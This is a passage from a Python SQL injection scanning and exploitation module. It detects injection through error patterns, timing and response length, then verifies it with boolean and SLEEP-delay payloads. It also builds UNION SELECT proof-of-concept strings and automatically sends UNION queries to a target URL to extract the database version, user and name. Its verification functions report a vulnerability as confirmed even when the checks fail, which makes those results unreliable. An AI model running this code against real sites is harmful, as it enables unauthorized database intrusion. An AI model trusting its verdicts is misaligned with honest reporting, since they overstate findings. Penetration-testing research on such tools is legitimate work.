            if not self.fuzzy_detector.baseline_profiles:
                baseline_profile = ResponseProfile.from_response(
                    baseline_body, response_status, baseline_time, response_headers
                )
                self.fuzzy_detector.add_baseline(baseline_profile)
            
            # Detect anomaly using fuzzy logic
            fuzzy_detected, fuzzy_score, fuzzy_reasons = self.fuzzy_detector.detect_anomaly(
                response_profile, payload_hint
            )
            
            if fuzzy_detected:
                anomalies.extend([f"fuzzy_logic: {reason}" for reason in fuzzy_reasons])
        
        # Check for INSERT-specific error patterns
        insert_error_patterns = [
            r'column.*count.*doesn.*match.*value.*count',
            r'wrong.*number.*of.*values',
            r'INSERT.*has more.*expressions',
            r'number.*of.*columns.*does not match',
            r'values.*list.*target.*list',
            r'column.*name.*or.*number.*of.*supplied.*values',
            r'ORA-00913',  # Oracle: too many values
            r'ORA-00947',  # Oracle: not enough values
        ]
        
        for pattern in insert_error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                anomalies.append(f"insert_param_count: {pattern}")
        
        # Check for quote-balancing success indicators
        if payload_hint and 'QUOTE' in payload_hint.upper():
            quote_success_patterns = [
                r'successfully.*inserted',
                r'record.*added',
                r'user.*created',
                r'data.*saved',
                r'operation.*completed',
            ]
            for pattern in quote_success_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    anomalies.append(f"quote_balanced_success: {pattern}")
        
        # Check for timing-based detection
        if baseline_response:
            _, baseline_time = baseline_response
            if response_time > baseline_time + 4.5:
                anomalies.append(f"time_based: Response delayed by {response_time - baseline_time:.2f}s")
        
        # Check for boolean-based indicators
        if self._check_boolean_indicators(response_body):
            anomalies.append("boolean_based: Success indicators detected")
        
        # Check for content length changes (useful for INSERT detection)
        if baseline_response:
            baseline_body, _ = baseline_response
            len_diff = abs(len(response_body) - len(baseline_body))
            if len_diff > self.SIGNIFICANT_CONTENT_LENGTH_DIFF:
                anomalies.append(f"content_change: Length difference of {len_diff} bytes")
        
        # Attempt DBMS fingerprinting from errors
        if error_indicators and not self.adaptive_strategy.detected_dbms:
            dbms, confidence = self.fingerprinter.fingerprint_from_error(response_body)
            if dbms and confidence > 0.7:
                self.adaptive_strategy.detected_dbms = dbms
                anomalies.append(f"dbms_detected: {dbms} (confidence: {confidence:.2f})")
        
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str],
        payload_used: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Step 3: Analyze and extract error/evidence from response.
        
        Enhanced with improved fingerprinting, privilege analysis, and per-attack scoring.
        Parse SQL errors and extract comprehensive database information.
        
        Args:
            response_body: Response body text
            anomalies: List of detected anomalies
            payload_used: Optional payload that triggered the response
            
        Returns:
            Evidence dictionary with comprehensive analysis
        """
        evidence = {
            'error_type': 'sql_injection',
            'details': {},
            'context_info': {},
            'confidence': 0.0,
            'attack_score': 0.0
        }
        
        # Enhanced DBMS detection using fingerprinter
        if not self.adaptive_strategy.detected_dbms:
            dbms, confidence = self.fingerprinter.fingerprint_from_error(response_body)
            if dbms and confidence > 0.7:
                self.adaptive_strategy.detected_dbms = dbms
                evidence['context_info']['database_type'] = dbms
                evidence['confidence'] = max(evidence['confidence'], confidence)
        else:
            evidence['context_info']['database_type'] = self.adaptive_strategy.detected_dbms
            evidence['confidence'] = max(evidence['confidence'], 0.85)
        
        # Extract specific error messages
        error_match = re.search(r'(syntax error|error in your SQL syntax|ORA-\d{5})[^\n]{0,100}', 
                               response_body, re.IGNORECASE)
        if error_match:
            evidence['details']['error_message'] = error_match.group(0)
        
        # Detect INSERT statement context
        insert_indicators = {
            'statement_type': None,
            'parameter_count_hint': None,
            'injection_point': None
        }
        
        for anomaly in anomalies:
            if 'insert_param_count' in anomaly:
                insert_indicators['statement_type'] = 'INSERT'
                # Try to extract parameter count from error message
                count_match = re.search(r'(\d+)\s+column', response_body, re.IGNORECASE)
                if count_match:
                    insert_indicators['parameter_count_hint'] = int(count_match.group(1))
                evidence['confidence'] = max(evidence['confidence'], 0.88)
        
        if insert_indicators['statement_type']:
            evidence['context_info']['insert_detection'] = insert_indicators
        
        # Detect quote-balanced injection success
        quote_balanced_detected = False
        for anomaly in anomalies:
            if 'quote_balanced_success' in anomaly:
                quote_balanced_detected = True
                evidence['context_info']['injection_method'] = 'quote_balanced'
                evidence['confidence'] = max(evidence['confidence'], 0.82)
        
        # Calculate confidence and attack score based on anomalies
        attack_score = 0.0
        for anomaly in anomalies:
            if 'sql_error' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.90)
                attack_score += 3.0
            elif 'dbms_detected' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.88)
                attack_score += 2.5
            elif 'fuzzy_logic' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.80)
                attack_score += 2.0
            elif 'time_based' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.80)
                attack_score += 2.5
            elif 'boolean_based' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.70)
                attack_score += 1.5
            elif 'content_change' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.65)
                attack_score += 1.0
        
        evidence['attack_score'] = attack_score
        evidence['details']['anomalies'] = anomalies
        evidence['details']['quote_balanced'] = quote_balanced_detected
        
        # Extract database version if available
        version_patterns = [
            (r'MySQL.*(\d+\.\d+\.\d+)', 'MySQL'),
            (r'PostgreSQL.*(\d+\.\d+)', 'PostgreSQL'),
            (r'Microsoft SQL Server.*(\d+)', 'MSSQL'),
            (r'Oracle.*(\d+[cg])', 'Oracle'),
            (r'SQLite.*(\d+\.\d+\.\d+)', 'SQLite'),
        ]
        
        for pattern, db_name in version_patterns:
            match = re.search(pattern, response_body, re.IGNORECASE)
            if match:
                evidence['context_info']['database_version'] = match.group(1)
                evidence['context_info']['database_type'] = db_name
                break
        
        # Attempt to detect privilege level from error messages
        privilege_indicators = {
            'high': ['root@', 'admin@', 'sa@', 'dbo', 'SYSDBA'],
            'medium': ['user@', 'app@'],
            'low': ['guest@', 'public@']
        }
        
        for level, indicators in privilege_indicators.items():
            for indicator in indicators:
                if indicator.lower() in response_body.lower():
                    evidence['context_info']['privilege_level'] = level
                    break
            if 'privilege_level' in evidence['context_info']:
                break
        
        # Determine injection type from payload
        if payload_used:
            if 'UNION' in payload_used.upper():
                evidence['context_info']['injection_type'] = 'union'
            elif 'SLEEP' in payload_used.upper() or 'WAITFOR' in payload_used.upper():
                evidence['context_info']['injection_type'] = 'time_based'
            elif any(op in payload_used.upper() for op in ['AND', 'OR']) and '=' in payload_used:
                evidence['context_info']['injection_type'] = 'boolean_based'
            else:
                evidence['context_info']['injection_type'] = 'error_based'
        
        return evidence
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """
        Step 4: Mutate input systematically to confirm or disprove vulnerabilities.
        
        Test true/false variations for boolean-based, or different delays for time-based.
        """
        import requests
        
        # Determine verification strategy based on payload type
        if 'SLEEP' in successful_payload.upper() or 'WAITFOR' in successful_payload.upper():
            # Time-based verification
            return self._verify_time_based(
                target_url, parameter_name, parameter_type, parameter_value,
                successful_payload, http_method, headers, cookies
            )
        elif "'" in successful_payload or '"' in successful_payload:
            # Boolean-based or error-based verification
            return self._verify_boolean_based(
                target_url, parameter_name, parameter_type, parameter_value,
                successful_payload, http_method, headers, cookies
            )
        
        # Generic verification
        return True, 0.70, "Vulnerability detected but verification incomplete"
    
    def _verify_time_based(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str,
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]]
    ) -> Tuple[bool, float, str]:
        """Verify time-based SQL injection."""
        import requests
        
        # Test with different delays
        delay_tests = [
            (3, successful_payload.replace('5', '3')),
            (7, successful_payload.replace('5', '7')),
        ]
        
        verified_count = 0
        
        for expected_delay, test_payload in delay_tests:
            try:
                injected_value = self._inject_payload(parameter_value, test_payload)
                start_time = time.time()
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                else:
                    continue
                
                response_time = time.time() - start_time
                
                # Check if response time matches expected delay
                if response_time >= expected_delay - 1:
                    verified_count += 1
                    
            except Exception:
                continue
        
        confirmed = verified_count >= 1
        confidence = 0.90 if verified_count == 2 else 0.80 if verified_count == 1 else 0.60
        evidence = f"Time-based SQL injection verified with {verified_count}/2 delay tests"
        
        return confirmed, confidence, evidence
    
    def _verify_boolean_based(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str,
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]]
    ) -> Tuple[bool, float, str]:
        """Verify boolean-based SQL injection."""
        import requests
        
        # Test true and false conditions
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"
        
        try:
            # Test true condition
            true_injected = self._inject_payload(parameter_value, true_payload)
            if parameter_type.upper() == "GET":
                true_response = requests.get(
                    target_url,
                    params={parameter_name: true_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            else:
                true_response = requests.post(
                    target_url,
                    data={parameter_name: true_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            
            # Test false condition
            false_injected = self._inject_payload(parameter_value, false_payload)
            if parameter_type.upper() == "GET":
                false_response = requests.get(
                    target_url,
                    params={parameter_name: false_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            else:
                false_response = requests.post(
                    target_url,
                    data={parameter_name: false_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            
            # Compare responses
            true_len = len(true_response.text)
            false_len = len(false_response.text)
            
            # Significant difference indicates boolean-based SQLi
            if abs(true_len - false_len) > 100:
                return True, 0.85, f"Boolean-based SQLi confirmed (true:{true_len} vs false:{false_len} bytes)"
            
        except Exception:
            pass
        
        return True, 0.70, "Error-based SQL injection confirmed (verification incomplete)"
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Step 5: Build proof-of-concept payloads for safe, verifiable exploits.
        
        Create a safe POC that demonstrates the SQL injection.
        """
        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
        
        # Select POC based on database type
        if db_type == 'MySQL':
            poc_payload = "' UNION SELECT 'POC', @@version, user()--"
            expected = "POC string and MySQL version information"
        elif db_type == 'PostgreSQL':
            poc_payload = "' UNION SELECT 'POC', version(), current_user--"
            expected = "POC string and PostgreSQL version information"
        elif db_type == 'MSSQL':
            poc_payload = "' UNION SELECT 'POC', @@version, SYSTEM_USER--"
            expected = "POC string and MSSQL version information"
        elif db_type == 'Oracle':
            poc_payload = "' UNION SELECT 'POC', banner FROM v$version--"
            expected = "POC string and Oracle version information"
        else:
            # Generic POC
            poc_payload = "' UNION SELECT 'POC', 'CONFIRMED', 'INJECTION'--"
            expected = "POC strings in response"
        
        return {
            'poc_payload': poc_payload,
            'expected_result': expected,
            'safety_notes': 'This POC only reads database metadata and does not modify data',
            'reproduction_steps': [
                f"1. Send request with parameter '{vulnerable_parameter}' containing: {poc_payload}",
                f"2. Observe response for: {expected}",
                "3. Vulnerability is confirmed if expected data appears in response"
            ],
            'original_payload': successful_payload,
            'database_type': db_type
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """
        Step 6: Exploitation automation for verified cases.
        
        Safely extract database information without modifying data.
        """
        import requests
        
        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
        
        # Define safe exploitation queries based on database type
        if db_type == 'MySQL':
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT user()--",
                'database': "' UNION SELECT database()--",
            }
        elif db_type == 'PostgreSQL':
            exploit_queries = {
                'version': "' UNION SELECT version()--",
                'user': "' UNION SELECT current_user--",
                'database': "' UNION SELECT current_database()--",
            }
        elif db_type == 'MSSQL':
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT SYSTEM_USER--",
                'database': "' UNION SELECT DB_NAME()--",
            }
        else:
            # Generic queries
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT user()--",
            }
        
        extracted_data = {}
        
        for key, query in exploit_queries.items():
            try:
                injected_value = self._inject_payload('', query)
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                else:
                    continue
                
                # Extract data from response (simplified)
                if response.status_code == 200:
                    # Look for database-specific patterns in response
                    if key == 'version':
                        version_patterns = [
                            r'(MySQL.*\d+\.\d+\.\d+)',
                            r'(PostgreSQL.*\d+\.\d+)',
                            r'(Microsoft SQL Server.*\d+)',
                        ]
                        for pattern in version_patterns:
                            match = re.search(pattern, response.text, re.IGNORECASE)
                            if match:
                                extracted_data[key] = match.group(1)
                                break
                    else:
                        # For other data, look for reasonable strings
                        lines = response.text.split('\n')
                        for line in lines:
                            line = line.strip()
                            if line and len(line) < 100 and '<' not in line:
                                extracted_data[key] = line
                                break
                
            except Exception:
                continue
        
        if extracted_data:
            return {
                'success': True,
                'data_extracted': extracted_data,
                'impact_level': 'high',
                'remediation': [
                    'Use parameterized queries or prepared statements',
                    'Implement input validation and sanitization',
                    'Apply principle of least privilege to database users',
                    'Use Web Application Firewall (WAF) for additional protection',
                    'Keep database software up to date'
                ]
            }
        
        return None
    
    # ========================================
    # Legacy/Compatibility Methods
    # ========================================
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit SQL injection to extract data.
        
        This method integrates steps 4, 5, and 6 for backward compatibility.
        """
        # Step 4: Verify the vulnerability
        confirmed, confidence, verification_evidence = self.step4_mutate_and_verify(
            target_url, vulnerable_parameter, parameter_type,
            '', successful_payload
        )
        
        if not confirmed:
            return None
        
        # Step 3: Get evidence for POC building (simplified for backward compatibility)
        evidence = {
            'context_info': {'database_type': 'Unknown'},
            'details': {}
        }
        
        # Step 5: Build POC
        poc_data = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
        
        # Step 6: Automated exploitation
        exploitation_result = self.step6_automated_exploitation(
            target_url, vulnerable_parameter, parameter_type,
            poc_data['poc_payload'], evidence
        )
        
        if exploitation_result:
            exploitation_result['poc'] = poc_data
            exploitation_result['verification'] = verification_evidence
        
        return exploitation_result


# Backward compatibility: SQLInjectionContext is an alias for SQLInjectionModule
SQLInjectionContext = SQLInjectionModule
